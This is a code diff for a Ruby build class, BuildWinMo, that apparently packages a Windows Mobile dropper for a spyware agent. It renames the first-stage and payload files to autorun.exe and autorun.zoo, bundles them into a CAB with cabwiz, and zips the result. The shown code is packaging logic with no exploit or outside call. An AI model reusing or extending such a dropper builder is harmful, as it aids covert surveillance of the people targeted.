@@ -70,7 +70,23 @@ class BuildWinMo < Build
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
 
-    @outputs = ['output', 'firststage']
+    File.rename(path('firststage'), path('autorun.exe'))
+    File.rename(path('output'), path('autorun.zoo'))
+
+    # if the file 'user' is present, we need to include it in the cab
+    # the file was saved during the melt phase
+    if File.exist? path('user')
+      FileUtils.cp_r(path('custom/.'), path('.'))
+    else
+      FileUtils.cp_r(path('new/.'), path(''))
+    end
+
+    CrossPlatform.exec path('cabwiz'), path('rcs.inf').gsub("/", '\\') + ' /compress'
+
+    File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
+    File.rename path('rcs.cab'), path(@appname + '.cab')
+
+    @outputs = ['autorun.zoo', 'autorun.exe', @appname + '.cab']
   end
 
   def pack(params)
@@ -79,33 +95,16 @@ class BuildWinMo < Build
     case params['type']
       when 'local'
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          z.file.open('autorun.exe', "w") { |f| f.write File.open(path('firststage'), 'rb') {|f| f.read} }
-          z.file.open('autorun.zoo', "w") { |f| f.write File.open(path('output'), 'rb') {|f| f.read} }
+          z.file.open('autorun.exe', "wb") { |f| f.write File.open(path('autorun.exe'), 'rb') {|f| f.read} }
+          z.file.open('autorun.zoo', "wb") { |f| f.write File.open(path('autorun.zoo'), 'rb') {|f| f.read} }
         end
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
 
       when 'remote'
-        File.rename(path('firststage'), path('autorun.exe'))
-        File.rename(path('output'), path('autorun.zoo'))
-
-        # if the file 'user' is present, we need to include it in the cab
-        # the file was saved during the melt phase
-        if File.exist? path('user')
-          FileUtils.cp_r(path('custom/.'), path('.'))
-        else
-          FileUtils.cp_r(path('new/.'), path(''))
-        end
-
-        CrossPlatform.exec path('cabwiz'), path('rcs.inf').gsub("/", '\\') + ' /compress'
-
-        File.exist? path('rcs.cab') || raise("output file not created by cabwiz")
-        File.rename path('rcs.cab'), path(@appname + '.cab')
-
         Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
-          z.file.open(@appname + '.cab', "w") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
+          z.file.open(@appname + '.cab', "wb") { |f| f.write File.open(path(@appname + '.cab'), 'rb') {|f| f.read} }
         end
-        
         # this is the only file we need to output after this point
         @outputs = ['output.zip']
     end
